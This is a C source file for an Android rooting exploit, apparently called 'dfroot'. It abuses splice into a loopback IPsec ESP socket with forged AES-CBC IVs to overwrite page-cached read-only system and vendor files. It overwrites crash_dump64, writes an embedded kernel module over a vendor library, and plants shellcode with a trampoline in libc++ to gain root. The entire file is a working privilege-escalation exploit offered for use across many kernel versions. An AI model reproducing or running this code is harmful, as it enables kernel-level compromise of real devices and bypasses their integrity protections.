#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sched.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <sys/utsname.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include "aes256.h"

static const char kCrashDump[] = "/apex/com.android.runtime/bin/crash_dump64";
static char    *libcxx_ko_target;

static int      g_encap_port;
static int      g_sender_port;
static uint32_t g_spi;
static uint8_t  g_aes_key[32];
static uint32_t g_seq = 1;
static int      g_kmi_android;
static int      g_kmi_major;
static int      g_kmi_minor;
static const char *g_vermagic;
struct PatchRestore {
    const char *lib;
    uint64_t    tramp_aligned;
    uint8_t     tramp_orig[16];
    uint64_t    shell_off;
    uint32_t    shell_padded;
    char        shell_orig[1024];
    int         valid;
};

static struct PatchRestore g_libcxx_r;

/* IV = AES256_ECB_DEC(key, old_content) XOR desired, so that CBC decryption
 * yields plaintext = AES_DEC(key, old_content) XOR IV = desired. */
static void compute_iv(const uint8_t old_content[16], const uint8_t desired[16], uint8_t iv[16]) {
    uint8_t dec[16];
    aes256_ecb_decrypt(g_aes_key, old_content, dec);
    for (int i = 0; i < 16; i++)
        iv[i] = dec[i] ^ desired[i];
}

/* vfork + exec crash_dump64 (splicehelper); dup2 write_fd onto target_fd in child.
 * Pass mode="r" for read, NULL for write-splice.
 * Returns waitpid status, or -1 if clone fails (already logged).
 */
static int spawn_crash_dump(off_t offset, int write_fd, int target_fd, const char *mode)
{
    char offstr[24];
    snprintf(offstr, sizeof(offstr), "%ld", (long)offset);
    int pid = (int)syscall(__NR_clone, SIGCHLD | CLONE_VFORK | CLONE_VM, 0, 0, 0, 0);
    if (pid < 0) { printf("vfork failed: %s\n", strerror(errno)); return -1; }
    if (pid == 0) {
        if (write_fd != target_fd && dup2(write_fd, target_fd) < 0) _exit(1);
        if (mode)
            execl(kCrashDump, "crashdump64", offstr, libcxx_ko_target, mode, NULL);
        else
            execl(kCrashDump, "crashdump64", offstr, libcxx_ko_target, NULL);
        _exit(1);
    }
    int st = 0;
    TEMP_FAILURE_RETRY(waitpid(pid, &st, 0));
    return st;
}

/* Read 16 bytes from vendor file at offset using crash_dump bridge (read mode).
 */
static int read_vendor_content(off_t offset, uint8_t buf[16]) {
    int rdpipe[2];
    if (pipe(rdpipe) < 0) { printf("pipe failed: %s\n", strerror(errno)); return -1; }

    int status = spawn_crash_dump(offset, rdpipe[1], 0, "r");
    close(rdpipe[1]);
    int n = 0;
    if (status >= 0 && WIFEXITED(status) && WEXITSTATUS(status) == 0)
        n = (int)TEMP_FAILURE_RETRY(read(rdpipe[0], buf, 16));
    close(rdpipe[0]);
    if (status < 0) return -1;
    if (n != 16) {
        if (WIFEXITED(status)) {
            static const char *const exit_meanings[] = {
                [0] = "success",
                [1] = "open vendor file failed or read returned < 16 bytes",
                [2] = "write to pipe returned < 16 bytes",
                [3] = "OUT_FD is not a pipe (fd sanitized by SELinux domain transition?)",
            };
            int ec = WEXITSTATUS(status);
            const char *meaning = (ec < 4) ? exit_meanings[ec] : "unknown";
            printf("read_vendor at 0x%lx got %d bytes: %s\n",
                     (long)offset, n, meaning);
        } else if (WIFSIGNALED(status))
            printf("read_vendor at 0x%lx got %d bytes: signal %d\n",
                     (long)offset, n, WTERMSIG(status));
        else
            printf("read_vendor at 0x%lx got %d bytes: status 0x%x\n",
                     (long)offset, n, status);
        return -1;
    }
    return 0;
}

/* Send one CBC write. ESP layout: SPI(4) + Seq(4) + IV(16) + ciphertext(16).
 * use_helper=0 splices the file page directly; use_helper=1 goes through
 * crash_dump64 for vendor files. sk_send is created once and reused. */
static int do_one_write_cbc(int pipe_rd, int pipe_wr, int sk_send, int file_fd, off_t offset,
                            const uint8_t iv[16], int use_helper) {
    uint8_t hdr[24];
    *(uint32_t *)(hdr + 0) = htonl(g_spi);
    *(uint32_t *)(hdr + 4) = htonl(g_seq++);
    memcpy(hdr + 8, iv, 16);

    struct iovec iov = {.iov_base = hdr, .iov_len = 24};
    if (vmsplice(pipe_wr, &iov, 1, SPLICE_F_GIFT) != 24) {
        printf("vmsplice hdr failed: %s\n", strerror(errno)); return -1;
    }

    if (use_helper) {
        int st = spawn_crash_dump(offset, pipe_wr, 1, NULL);
        if (st < 0) return -1;
        if (!(WIFEXITED(st) && WEXITSTATUS(st) == 0)) {
            printf("splice helper failed status=0x%x\n", st);
            return -1;
        }
    } else {
        off_t off = offset;
        if (splice(file_fd, &off, pipe_wr, NULL, 16, SPLICE_F_MOVE) != 16) {
            printf("splice file failed: %s\n", strerror(errno)); return -1;
        }
    }

    ssize_t s = splice(pipe_rd, NULL, sk_send, NULL, 40, 0);
    if (s != 40) { printf("splice pipe->udp: %zd expected 40\n", s); return -1; }
    return 0;
}

/* Patch len bytes at foff in 16-byte CBC blocks. old_content comes from pread()
 * for system files and via the crash_dump bridge for vendor files; len must be
 * a multiple of 16. */
static int patch_file_cbc(const char *path, const char *payload, size_t len,
                           size_t foff, int use_helper) {
    if (len % 16 != 0) {
        printf("patch_file_cbc: len=%zu not multiple of 16\n", len);
        return -1;
    }

    int sk_send = socket(AF_INET, SOCK_DGRAM, 0);
    if (sk_send < 0) { printf("socket failed: %s\n", strerror(errno)); return -1; }
    int opt = 1;
    setsockopt(sk_send, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    struct sockaddr_in src = {
        .sin_family = AF_INET,
        .sin_port   = htons((uint16_t)g_sender_port),
        .sin_addr   = {.s_addr = htonl(INADDR_LOOPBACK)},
    };
    if (bind(sk_send, (struct sockaddr *)&src, sizeof(src)) < 0)
        printf("bind port %d failed: %s\n", g_sender_port, strerror(errno));
    struct sockaddr_in dst = {
        .sin_family = AF_INET,
        .sin_port   = htons((uint16_t)g_encap_port),
        .sin_addr   = {.s_addr = htonl(INADDR_LOOPBACK)},
    };
    if (connect(sk_send, (struct sockaddr *)&dst, sizeof(dst)) < 0) {
        printf("connect failed: %s\n", strerror(errno));
        close(sk_send); return -1;
    }

    int file_fd = -1;
    if (!use_helper) {
        file_fd = open(path, O_RDONLY);
        if (file_fd < 0) {
            printf("open %s failed: %s\n", path, strerror(errno));
            close(sk_send); return -1;
        }
    }

    int pfd[2];
    if (pipe(pfd) < 0) {
        printf("pipe failed: %s\n", strerror(errno));
        if (!use_helper) close(file_fd);
        close(sk_send);
        return -1;
    }

    int rc = 0;
    for (size_t i = 0; i < len / 16; i++) {
        off_t off = (off_t)(foff + i * 16);
        uint8_t old_content[16] = {0};

        if (use_helper) {
            if (read_vendor_content(off, old_content) < 0) {
                rc = -1; break;
            }
        } else {
            if (pread(file_fd, old_content, 16, off) != 16) {
                printf("pread at 0x%lx failed: %s\n", (long)off, strerror(errno));
                rc = -1; break;
            }
        }

        uint8_t desired[16] = {0};
        memcpy(desired, payload + i * 16, 16);

        uint8_t iv[16];
        compute_iv(old_content, desired, iv);

        if (do_one_write_cbc(pfd[0], pfd[1], sk_send, file_fd, off, iv, use_helper) < 0) {
            printf("write #%zu at 0x%lx failed\n", i, (long)off);
            rc = -1; break;
        }
    }

    close(pfd[0]); close(pfd[1]);
    if (!use_helper) close(file_fd);
    close(sk_send);
    if (rc == 0) printf("patched %zu bytes to %s+0x%zx\n", len, path, foff);
    return rc;
}

/* ---- KO and splicehelper blobs ---- */

extern char libcxx_start[];
extern char libcxx_data[];
extern uint32_t libcxx_len;
extern char libcxx_first_inst_copy[];
extern uint32_t libcxx_ko_target_off;

asm(
    ".section .rodata\n"
    ".global dfroot_ko_12_5_10_start\n.global dfroot_ko_12_5_10_end\n"
    "dfroot_ko_12_5_10_start:\n.incbin \"ko/dfroot-android12-5.10.ko\"\ndfroot_ko_12_5_10_end:\n"
    ".global dfroot_ko_13_5_10_start\n.global dfroot_ko_13_5_10_end\n"
    "dfroot_ko_13_5_10_start:\n.incbin \"ko/dfroot-android13-5.10.ko\"\ndfroot_ko_13_5_10_end:\n"
    ".global dfroot_ko_13_5_15_start\n.global dfroot_ko_13_5_15_end\n"
    "dfroot_ko_13_5_15_start:\n.incbin \"ko/dfroot-android13-5.15.ko\"\ndfroot_ko_13_5_15_end:\n"
    ".global dfroot_ko_14_5_15_start\n.global dfroot_ko_14_5_15_end\n"
    "dfroot_ko_14_5_15_start:\n.incbin \"ko/dfroot-android14-5.15.ko\"\ndfroot_ko_14_5_15_end:\n"
    ".global dfroot_ko_14_6_1_start\n.global dfroot_ko_14_6_1_end\n"
    "dfroot_ko_14_6_1_start:\n.incbin \"ko/dfroot-android14-6.1.ko\"\ndfroot_ko_14_6_1_end:\n"
    ".global dfroot_ko_15_6_6_start\n.global dfroot_ko_15_6_6_end\n"
    "dfroot_ko_15_6_6_start:\n.incbin \"ko/dfroot-android15-6.6.ko\"\ndfroot_ko_15_6_6_end:\n"
    ".global dfroot_ko_16_6_12_start\n.global dfroot_ko_16_6_12_end\n"
    "dfroot_ko_16_6_12_start:\n.incbin \"ko/dfroot-android16-6.12.ko\"\ndfroot_ko_16_6_12_end:\n"
    ".global dfroot_ko_17_6_18_start\n.global dfroot_ko_17_6_18_end\n"
    "dfroot_ko_17_6_18_start:\n.incbin \"ko/dfroot-android17-6.18.ko\"\ndfroot_ko_17_6_18_end:\n"
);

asm(
    ".section .rodata\n"
    ".global splice_helper_start\n.global splice_helper_end\n"
    "splice_helper_start:\n.incbin \"splicehelper\"\nsplice_helper_end:\n"
);

extern char dfroot_ko_12_5_10_start[], dfroot_ko_12_5_10_end[];
extern char dfroot_ko_13_5_10_start[], dfroot_ko_13_5_10_end[];
extern char dfroot_ko_13_5_15_start[], dfroot_ko_13_5_15_end[];
extern char dfroot_ko_14_5_15_start[], dfroot_ko_14_5_15_end[];
extern char dfroot_ko_14_6_1_start[],  dfroot_ko_14_6_1_end[];
extern char dfroot_ko_15_6_6_start[],  dfroot_ko_15_6_6_end[];
extern char dfroot_ko_16_6_12_start[], dfroot_ko_16_6_12_end[];
extern char dfroot_ko_17_6_18_start[], dfroot_ko_17_6_18_end[];
extern char splice_helper_start[], splice_helper_end[];

struct KoImage { int android_release, kver_major, kver_minor; const char *start, *end; };

static const struct KoImage *select_ko_image(int andr, int major, int minor) {
    static const struct KoImage imgs[] = {
        {12, 5, 10, dfroot_ko_12_5_10_start, dfroot_ko_12_5_10_end},
        {13, 5, 10, dfroot_ko_13_5_10_start, dfroot_ko_13_5_10_end},
        {13, 5, 15, dfroot_ko_13_5_15_start, dfroot_ko_13_5_15_end},
        {14, 5, 15, dfroot_ko_14_5_15_start, dfroot_ko_14_5_15_end},
        {14, 6,  1, dfroot_ko_14_6_1_start,  dfroot_ko_14_6_1_end},
        {15, 6,  6, dfroot_ko_15_6_6_start,  dfroot_ko_15_6_6_end},
        {16, 6, 12, dfroot_ko_16_6_12_start, dfroot_ko_16_6_12_end},
        {17, 6, 18, dfroot_ko_17_6_18_start, dfroot_ko_17_6_18_end},
    };
    const struct KoImage *fb = NULL;
    for (size_t i = 0; i < sizeof(imgs)/sizeof(imgs[0]); i++) {
        if (imgs[i].kver_major != major || imgs[i].kver_minor != minor) continue;
        if (imgs[i].android_release == andr) return &imgs[i];
        if (!fb) fb = &imgs[i];
    }
    return fb;
}

static int trim_nl(char *s) {
    size_t n = strlen(s);
    while (n && (s[n - 1] == '\n' || s[n - 1] == '\r' || s[n - 1] == ' '))
        s[--n] = '\0';
    return n ? 0 : -1;
}

static int read_prop(const char *name, char *buf, size_t n) {
    char cmd[96];
    snprintf(cmd, sizeof(cmd), "getprop %s", name);
    FILE *f = popen(cmd, "r");
    if (!f) return -1;
    if (!fgets(buf, (int)n, f)) {
        pclose(f);
        if (n) buf[0] = '\0';
        return -1;
    }
    pclose(f);
    return trim_nl(buf);
}

static int read_device_versions(int *andr, int *major, int *minor) {
    if (g_kmi_android > 0) {
        *andr = g_kmi_android;
        *major = g_kmi_major;
        *minor = g_kmi_minor;
        return 0;
    }
    int have_kver = 0, have_andr = 0;
    struct utsname u;
    if (uname(&u) == 0) {
        if (sscanf(u.release, "%d.%d", major, minor) == 2) have_kver = 1;
        const char *m = strstr(u.release, "android");
        if (m) {
            *andr = atoi(m + 7);
            if (*andr > 0) have_andr = 1;
        }
    }
    if (!have_kver) {
        char kver[32];
        if (read_prop("ro.kernel.version", kver, sizeof(kver)) != 0) return -1;
        if (sscanf(kver, "%d.%d", major, minor) != 2) return -1;
        have_kver = 1;
    }
    if (!have_andr) {
        char aver[32];
        if (read_prop("ro.vendor.build.version.release", aver, sizeof(aver)) != 0) return -1;
        *andr = atoi(aver);
        if (*andr <= 0) return -1;
        printf("kmi: uname missing android version, using getprop android%d-%d.%d\n",
               *andr, *major, *minor);
    }
    return 0;
}

/* Pad payload to a multiple of 16 bytes in a heap buffer. Caller must free(). */
static char *pad16(const char *data, size_t len, size_t *out_len) {
    size_t padded = (len + 15) & ~(size_t)15;
    char *buf = calloc(1, padded);
    if (buf) memcpy(buf, data, len);
    *out_len = padded;
    return buf;
}

static uint16_t rd16(const uint8_t *p) {
    return (uint16_t)(p[0] | ((uint16_t)p[1] << 8));
}

static uint32_t rd32(const uint8_t *p) {
    return (uint32_t)p[0] | ((uint32_t)p[1] << 8) |
           ((uint32_t)p[2] << 16) | ((uint32_t)p[3] << 24);
}

static uint64_t rd64(const uint8_t *p) {
    return (uint64_t)rd32(p) | ((uint64_t)rd32(p + 4) << 32);
}

static void wr64(uint8_t *p, uint64_t value) {
    for (int i = 0; i < 8; i++) p[i] = (uint8_t)(value >> (i * 8));
}

static int patch_ko_vermagic(char *buf, size_t len, size_t capacity, size_t *new_len) {
    if (!g_vermagic || !g_vermagic[0]) {
        printf("vermagic: no target supplied, keeping module value\n");
        return 0;
    }
    printf("vermagic: checking module\n");
    printf("vermagic: target=%s\n", g_vermagic);
    printf("vermagic: original size=%zu capacity=%zu\n", len, capacity);
    if (len < 64 || memcmp(buf, "\x7f""ELF", 4) != 0 || buf[4] != 2 ||
        buf[5] != 1 || rd16((uint8_t *)buf + 0x3a) != 64) {
        printf("vermagic: failed - unsupported ELF64 little-endian module\n");
        return -1;
    }

    uint64_t shoff = rd64((uint8_t *)buf + 0x28);
    uint16_t shnum = rd16((uint8_t *)buf + 0x3c);
    uint16_t shstrndx = rd16((uint8_t *)buf + 0x3e);
    if (!shoff || !shnum || shstrndx >= shnum || shoff + (uint64_t)shnum * 64 > len) {
        printf("vermagic: failed - invalid ELF section headers (shoff=0x%llx shnum=%u shstr=%u)\n",
               (unsigned long long)shoff, shnum, shstrndx);
        return -1;
    }

    const uint8_t *shstr = (uint8_t *)buf + shoff + (uint64_t)shstrndx * 64;
    uint64_t shstr_off = rd64(shstr + 0x18);
    uint64_t shstr_size = rd64(shstr + 0x20);
    if (shstr_off + shstr_size > len) {
        printf("vermagic: failed - section name string table outside file\n");
        return -1;
    }

    uint8_t *modinfo = NULL;
    uint64_t modinfo_off = 0, modinfo_size = 0, modinfo_align = 1;
    for (uint16_t i = 0; i < shnum; i++) {
        uint8_t *sh = (uint8_t *)buf + shoff + (uint64_t)i * 64;
        uint32_t name_off = rd32(sh);
        if (name_off >= shstr_size) continue;
        const char *name = buf + shstr_off + name_off;
        size_t max = (size_t)(shstr_size - name_off);
        if (strnlen(name, max) == 8 && !memcmp(name, ".modinfo", 8)) {
            modinfo = sh;
            modinfo_off = rd64(sh + 0x18);
            modinfo_size = rd64(sh + 0x20);
            modinfo_align = rd64(sh + 0x30);
            break;
        }
    }
    if (!modinfo) {
        printf("vermagic: failed - .modinfo not found\n");
        return -1;
    }
    if (modinfo_off + modinfo_size > len) {
        printf("vermagic: failed - .modinfo outside file (off=0x%llx size=%llu)\n",
               (unsigned long long)modinfo_off, (unsigned long long)modinfo_size);
        return -1;
    }
    printf("vermagic: .modinfo offset=0x%llx size=%llu alignment=%llu\n",
           (unsigned long long)modinfo_off, (unsigned long long)modinfo_size,
           (unsigned long long)modinfo_align);
    if (!modinfo_align || (modinfo_align & (modinfo_align - 1))) modinfo_align = 1;

    char replacement[256];
    int replacement_len = snprintf(replacement, sizeof(replacement), "vermagic=%s", g_vermagic);
    if (replacement_len <= 0 || (size_t)replacement_len >= sizeof(replacement)) {
        printf("vermagic: failed - target string too long\n");
        return -1;
    }

    for (size_t pos = 0; pos < modinfo_size;) {
        size_t end = pos;
        while (end < modinfo_size && buf[modinfo_off + end] != '\0') end++;
        if ((size_t)replacement_len == end - pos &&
            !memcmp(buf + modinfo_off + pos, replacement, (size_t)replacement_len)) {
            printf("vermagic: already current, no change\n");
            return 0;
        }
        pos = end + 1;
    }

    size_t entries_len = 0;
    for (size_t pos = 0; pos < modinfo_size;) {
        size_t end = pos;
        while (end < modinfo_size && buf[modinfo_off + end] != '\0') end++;
        size_t entry_len = end - pos;
        if (entry_len && !(entry_len >= 9 && !memcmp(buf + modinfo_off + pos, "vermagic=", 9)))
            entries_len += entry_len + 1;
        pos = end + 1;
    }
    size_t new_modinfo_len = entries_len + (size_t)replacement_len + 1;
    size_t new_offset = (len + modinfo_align - 1) & ~(size_t)(modinfo_align - 1);
    if (new_offset + new_modinfo_len > capacity) {
        printf("vermagic: failed - insufficient space, need=%zu available=%zu\n",
               new_offset + new_modinfo_len, capacity);
        return -1;
    }

    size_t out = new_offset;
    for (size_t pos = 0; pos < modinfo_size;) {
        size_t end = pos;
        while (end < modinfo_size && buf[modinfo_off + end] != '\0') end++;
        size_t entry_len = end - pos;
        if (entry_len && !(entry_len >= 9 && !memcmp(buf + modinfo_off + pos, "vermagic=", 9))) {
            memcpy(buf + out, buf + modinfo_off + pos, entry_len);
            out += entry_len;
            buf[out++] = '\0';
        }
        pos = end + 1;
    }
    memcpy(buf + out, replacement, (size_t)replacement_len);
    out += (size_t)replacement_len;
    buf[out++] = '\0';
    if (out < new_offset + new_modinfo_len) memset(buf + out, 0, new_offset + new_modinfo_len - out);

    wr64(modinfo + 0x18, new_offset);
    wr64(modinfo + 0x20, new_modinfo_len);
    memset(buf + len, 0, new_offset - len);
    *new_len = new_offset + new_modinfo_len;
    printf("vermagic: patched to %s\n", g_vermagic);
    printf("vermagic: new .modinfo offset=0x%zx size=%zu\n", new_offset, new_modinfo_len);
    return 1;
}

/* Write splicehelper into crash_dump64 page cache. */
static int patch_helper(void) {
    size_t len;
    char *buf = pad16(splice_helper_start,
                      (size_t)(splice_helper_end - splice_helper_start), &len);
    if (!buf) { printf("patch: crash_dump64 - pad16 alloc failed\n"); return -1; }
    printf("patch: crash_dump64 <- splicehelper (%zu bytes)\n", len);
    int ret = patch_file_cbc(kCrashDump, buf, len, 0, 0);
    if (ret) { free(buf); printf("patch: crash_dump64 patch failed: %d\n", ret); return ret; }

    uint8_t verify[16];
    int vfd = open(kCrashDump, O_RDONLY);
    if (vfd >= 0) {
        ssize_t n = pread(vfd, verify, 16, 16);
        close(vfd);
        if (n == 16 && memcmp(verify, buf + 16, 16) != 0) {
            printf("patch: crash_dump64 verification failed\n");
            printf("patch: DEVICE NOT VULNERABLE\n");
            free(buf);
            return -1;
        }
    }
    free(buf);
    return 0;
}

static int patch_ko(void) {
    int andr = 0, major = 0, minor = 0;
    if (read_device_versions(&andr, &major, &minor) != 0) {
        printf("Can't parse kernel version - Non-GKI device? (unsupported)\n"); return 1;
    }
    const struct KoImage *ko = select_ko_image(andr, major, minor);
    if (!ko) {
        printf("Unsupported kernel %d.%d android %d\n", major, minor, andr); return 1;
    }
    printf("Using KMI: android%d-%d.%d\n",
             ko->android_release, ko->kver_major, ko->kver_minor);

    size_t raw_len = (size_t)(ko->end - ko->start);
    size_t capacity = raw_len + 512;
    printf("ko: preparing KMI android%d-%d.%d raw=%zu capacity=%zu\n",
           ko->android_release, ko->kver_major, ko->kver_minor, raw_len, capacity);
    char *buf = calloc(1, (capacity + 15) & ~(size_t)15);
    if (!buf) { printf("patch: %s - ko alloc failed\n", libcxx_ko_target); return -1; }
    memcpy(buf, ko->start, raw_len);
    size_t len = raw_len;
    int vm = patch_ko_vermagic(buf, raw_len, capacity, &len);
    if (vm < 0) { printf("ko: vermagic patch failed, aborting\n"); free(buf); return -1; }
    printf("ko: vermagic result=%s size=%zu\n", vm ? "changed" : "unchanged", len);
    len = (len + 15) & ~(size_t)15;
    printf("ko: writing target=%s aligned size=%zu\n", libcxx_ko_target, len);
    printf("patch: %s <- dfroot.ko (%zu bytes)\n", libcxx_ko_target, len);
    int ret = patch_file_cbc(libcxx_ko_target, buf, len, 0, 1);
    free(buf);
    if (ret) printf("ko: write failed ret=%d\n", ret);
    else printf("ko: write succeeded\n");
    return ret;
}

static void cleanup(void) {
    if (!g_libcxx_r.valid) return;
    printf("\n=== cleanup ===\n");
    printf("restoring trampoline in %s\n", g_libcxx_r.lib);
    patch_file_cbc(g_libcxx_r.lib, (char *)g_libcxx_r.tramp_orig, 16,
                   (size_t)g_libcxx_r.tramp_aligned, 0);
    printf("restoring shellcode in %s\n", g_libcxx_r.lib);
    patch_file_cbc(g_libcxx_r.lib, g_libcxx_r.shell_orig, g_libcxx_r.shell_padded,
                   (size_t)g_libcxx_r.shell_off, 0);
}

int find_hook_target(const char *lib, const char *sym,
                     uint64_t *hook, uint64_t *payload, uint32_t *first_insn,
                     size_t shellcode_size);

static int patch_hook(const char *lib, const char *sym,
                      char *stage_data, uint32_t stage_len, char *stage_start,
                      char *first_inst_copy, struct PatchRestore *restore) {
    const uint32_t BRANCH = 0x14000000;
    uint32_t start_delta = (uint32_t)(stage_start - stage_data);

    size_t padded; char *buf = pad16(stage_data, stage_len, &padded);
    if (!buf) { printf("patch: %s - pad16 alloc failed\n", lib); return -1; }

    if (padded > sizeof(restore->shell_orig)) {
        printf("shellcode too large to save (%zu)\n", padded);
        free(buf); return -1;
    }

    uint64_t hook_off, shell_off; uint32_t first_insn;
    printf("Finding symbol offsets for %s:\n", lib);
    if (find_hook_target(lib, sym, &hook_off, &shell_off, &first_insn, padded)) {
        printf("failed to find offsets for %s\n", lib); free(buf); return 1;
    }
    printf("Found: hook=0x%lx shellcode=0x%lx len=%u\n", hook_off, shell_off, stage_len);

    uint32_t hook_insn = BRANCH | (((shell_off + start_delta - hook_off) >> 2) & 0x3ffffff);

    if (first_insn == hook_insn) {
        printf("%s already patched\n", lib); free(buf); return 0;
    }
    uint32_t jmpback = BRANCH |
        (((hook_off + 4) - (shell_off + stage_len - 4)) >> 2 & 0x3ffffff);
    *(uint32_t *)&buf[stage_len - 4] = jmpback;
    *(uint32_t *)&buf[first_inst_copy - stage_data] = first_insn;

    uint64_t aligned = hook_off & ~(uint64_t)15;
    int fd = open(lib, O_RDONLY);
    if (fd < 0) { printf("open %s failed: %s\n", lib, strerror(errno)); free(buf); return -1; }
    int ok = pread(fd, restore->shell_orig, padded,  (off_t)shell_off) == (ssize_t)padded
          && pread(fd, restore->tramp_orig, 16,       (off_t)aligned)  == 16;
    close(fd);
    if (!ok) { printf("pread %s save failed\n", lib); free(buf); return -1; }

    restore->lib           = lib;
    restore->shell_off     = shell_off;
    restore->shell_padded  = (uint32_t)padded;
    restore->tramp_aligned = aligned;
    restore->valid         = 1;

    printf("patch: %s <- shellcode (%zu bytes)\n", lib, padded);
    int ret = patch_file_cbc(lib, buf, padded, shell_off, 0);
    free(buf);
    if (ret) { printf("patch: %s shellcode patch failed: %d\n", lib, ret); return ret; }

    int pos = (int)(hook_off & 15);
    uint8_t blk[16];
    memcpy(blk, restore->tramp_orig, 16);
    memcpy(&blk[pos], &hook_insn, 4);
    printf("patch: %s <- trampoline (16 bytes)\n", lib);
    int ret2 = patch_file_cbc(lib, (char *)blk, 16, (size_t)aligned, 0);
    if (ret2) printf("patch: %s trampoline patch failed: %d\n", lib, ret2);
    return ret2;
}

static int createOrphanProcess(void) {
    printf("Triggering hook...\n");
    int pid = fork();
    if (pid < 0) { printf("Failed to create orphan: %s\n", strerror(errno)); return -1; }
    if (pid == 0) {
        int pid2 = fork();
        if (pid2 == 0) { sleep(1); _exit(0); }
        _exit(0);
    }
    TEMP_FAILURE_RETRY(waitpid(pid, NULL, 0));
    return 0;
}

static const char *detect_ko_target(void) {
    static const char *const candidates[] = {
        "/vendor/lib64/libbinderdebug.so",
        "/vendor/lib64/libstagefrighthw.so",
        "/vendor/lib64/libstagefright_aidl_bufferpool2.so",
    };
    for (size_t i = 0; i < sizeof(candidates) / sizeof(candidates[0]); i++) {
        if (access(candidates[i], F_OK) == 0)
            return candidates[i];
    }
    return candidates[0];
}

static int hex_to_bytes(const char *hex, uint8_t *out, size_t len) {
    if (strlen(hex) != len * 2) return -1;
    for (size_t i = 0; i < len; i++) {
        unsigned int b;
        if (sscanf(hex + i * 2, "%2x", &b) != 1) return -1;
        out[i] = (uint8_t)b;
    }
    return 0;
}

static int parse_kmi(const char *kmi, int *andr, int *major, int *minor) {
    char tail;
    if (sscanf(kmi, "android%d-%d.%d%c", andr, major, minor, &tail) != 3) return -1;
    return (*andr > 0 && *major > 0 && *minor >= 0) ? 0 : -1;
}

static void usage(const char *argv0) {
    fprintf(stderr,
            "usage: %s --encap-port N --sender-port N --spi N --aes-key HEX [--kmi BRANCH] [--vermagic STRING]\n",
            argv0);
}

static int setup(int argc, char **argv) {
    int encap_port = 0, sender_port = 0;
    uint32_t spi = 0;
    uint8_t aes_key[32];
    int have_aes = 0;
    const char *kmi = NULL;
    const char *vermagic = NULL;

    for (int i = 1; i < argc; i++) {
        const char *a = argv[i];
        if (!strcmp(a, "--encap-port") && i + 1 < argc)
            encap_port = atoi(argv[++i]);
        else if (!strcmp(a, "--sender-port") && i + 1 < argc)
            sender_port = atoi(argv[++i]);
        else if (!strcmp(a, "--spi") && i + 1 < argc)
            spi = (uint32_t)strtoul(argv[++i], NULL, 0);
        else if (!strcmp(a, "--aes-key") && i + 1 < argc)
            have_aes = hex_to_bytes(argv[++i], aes_key, sizeof(aes_key)) == 0;
        else if (!strcmp(a, "--kmi") && i + 1 < argc)
            kmi = argv[++i];
        else if (!strcmp(a, "--vermagic") && i + 1 < argc)
            vermagic = argv[++i];
        else { usage(argv[0]); return 2; }
    }
    if (!encap_port || !sender_port || !spi || !have_aes) {
        usage(argv[0]); return 2;
    }

    g_encap_port  = encap_port;
    g_sender_port = sender_port;
    g_spi         = spi;
    g_seq         = 1;
    memcpy(g_aes_key, aes_key, 32);
    g_vermagic = vermagic;

    if (kmi && parse_kmi(kmi, &g_kmi_android, &g_kmi_major, &g_kmi_minor) != 0) {
        fprintf(stderr, "invalid --kmi: %s\n", kmi);
        return 2;
    }
    if (kmi && !select_ko_image(g_kmi_android, g_kmi_major, g_kmi_minor)) {
        fprintf(stderr, "unsupported --kmi: %s\n", kmi);
        return 2;
    }

    const char *ko_target = detect_ko_target();
    libcxx_ko_target = libcxx_data + libcxx_ko_target_off;
    strncpy(libcxx_ko_target, ko_target, 63);
    libcxx_ko_target[63] = '\0';

    printf("=== setup ===\n");
    printf("found ko_target: %s\n", ko_target);
    printf("kmi selection: %s\n", kmi ? kmi : "auto");
    printf("encap port: %d\n", encap_port);
    printf("spi: 0x%x\n", spi);
    return 0;
}

static int exploit(void) {
    printf("\n=== exploit (patching files) ===\n");

    int rc = 3;
    if (patch_helper()) goto done;
    if (patch_ko()) goto done;
    if (patch_hook("/system/lib64/libc++.so",
                   "_ZNSt3__113basic_ostreamIcNS_11char_traitsIcEEE6sentryC1ERS3_",
                   libcxx_data, libcxx_len, libcxx_start, libcxx_first_inst_copy,
                   &g_libcxx_r)) goto done;

    rc = 2;
    usleep(500000);
    
    printf("\n=== init  ===\n");
    createOrphanProcess();

    /* Markers live under the app's data directory, not /dev. Placed here so the
     * app can read the same timeline the daemon does. */
    static const char *const MARKERS = "/data/user_de/0/df.root/markers/";
    static const struct {
        const char *name;
        const char *msg;
        int         rc;
    } markers[] = {
        { "kernel-module",      "kernel module: launching bootstrap",        -1 },
        { "reached-prefs",      "daemon: reading app preferences file",      -1 },
        { "warn-prefs",         "daemon: WARNING - reading prefs failed",    -1 },
        { "reached-zygote-env", "daemon: adopting zygote env",               -1 },
        { "warn-zygote-env",    "daemon: WARNING - adopt zygote env failed", -1 },
        { "reached-partitions", "daemon: setting partitions ro",             -1 },
        { "warn-partitions",    "daemon: WARNING - set partitions ro failed",-1 },
        { "reached-modules",    "daemon: disabling ksu modules",             -1 },
        { "err-modules",        "daemon: disable modules reported an error",  -1 },
        /* Ready, or the handed-off plan already progressed far enough that
         * cleanup deleted the ready marker (soft reboot). Either is success. */
        { "daemon-ready",       "daemon: ready - control channel is open",    0 },
        { "plan-accepted",      "daemon: plan accepted (cleanup / reboot)",   0 },
        { "plan-done",          "daemon: plan completed",                     0 },
        { "err-transport",      "daemon: ERROR - control channel unavailable",1 },
    };
    int seen[sizeof(markers)/sizeof(markers[0])] = {0};

    for (int elapsed = 0; elapsed < 10000; elapsed += 10) {
        usleep(10000);
        for (size_t j = 0; j < sizeof(markers)/sizeof(markers[0]); j++) {
            if (seen[j]) continue;
            char path[256];
            snprintf(path, sizeof(path), "%s%s", MARKERS, markers[j].name);
            if (access(path, F_OK) != 0) continue;
            seen[j] = 1;
            printf("%s\n", markers[j].msg);
            /* rc 0 ends the run while leaving the daemon alive; the app
             * owns the control channel from here on. */
            if (markers[j].rc > 0 || markers[j].rc == 0) { rc = markers[j].rc; goto done; }
        }
    }
    printf("timeout: ERROR - check logcat & dmesg\n");
done:
    if (rc == 3) printf("patch: ERROR - failed to patch files\n");
    return rc;
}

int main(int argc, char **argv) {
    setvbuf(stdout, NULL, _IONBF, 0);
    if (setup(argc, argv) != 0) return 2;
    int rc = exploit();
    cleanup();
    return rc;
}
